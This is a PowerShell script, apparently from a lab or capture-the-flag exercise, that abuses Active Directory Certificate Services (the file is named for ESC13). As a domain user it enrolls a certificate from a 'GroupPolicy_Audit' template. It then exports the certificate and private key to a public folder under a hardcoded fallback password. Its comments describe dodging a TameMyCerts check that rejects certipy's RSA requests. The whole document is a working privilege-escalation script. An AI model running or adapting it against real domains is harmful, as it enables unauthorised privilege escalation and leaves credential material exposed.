# Run as AIRWAYS\Isabel.O on WKSTN01 (interactive / schtasks /IT).
# Template GroupPolicy_Audit is ECDSA P-256; certipy RSA CSRs fail TameMyCerts.
$ErrorActionPreference = 'Continue'
$pfxPass = $env:PFX_PASS
if (-not $pfxPass) { $pfxPass = 'PfxChangeMe1!' }
$outPfx = 'C:\Users\Public\esc13.pfx'
$log = 'C:\Users\Public\enroll.log'
function L($m) { "$(Get-Date -Format o) $m" | Out-File -FilePath $log -Append -Encoding ASCII }
L "start user=$env:USERNAME domain=$env:USERDOMAIN"

try {
  $req = New-Object -ComObject X509Enrollment.CX509CertificateRequestPkcs10
  $req.InitializeFromTemplateName(1, 'GroupPolicy_Audit')
  $enroll = New-Object -ComObject X509Enrollment.CX509Enrollment
  $enroll.InitializeFromRequest($req)
  $enroll.Enroll()
  L "enroll status=$($enroll.Status.Status) text=$($enroll.Status.ErrorText)"
  $pfxB64 = $enroll.CreatePFX($pfxPass, 0)
  [IO.File]::WriteAllBytes($outPfx, [Convert]::FromBase64String($pfxB64))
  L "wrote $outPfx bytes=$((Get-Item $outPfx).Length)"
} catch {
  L "COM enroll fail: $($_.Exception.Message)"
  Get-Certificate -Template 'GroupPolicy_Audit' -CertStoreLocation Cert:\CurrentUser\My -Url ldap: -ErrorAction SilentlyContinue
  $pwd = ConvertTo-SecureString $pfxPass -AsPlainText -Force
  Get-ChildItem Cert:\CurrentUser\My -ErrorAction SilentlyContinue | ForEach-Object {
    L "store thumb=$($_.Thumbprint) subj=$($_.Subject)"
    try { Export-PfxCertificate -Cert $_ -FilePath $outPfx -Password $pwd -Force | Out-Null } catch { L "export fail: $_" }
  }
}
Get-ChildItem Cert:\CurrentUser\My | Select-Object Thumbprint, Subject, NotAfter | Format-List | Out-String | ForEach-Object { L $_ }
L 'done'
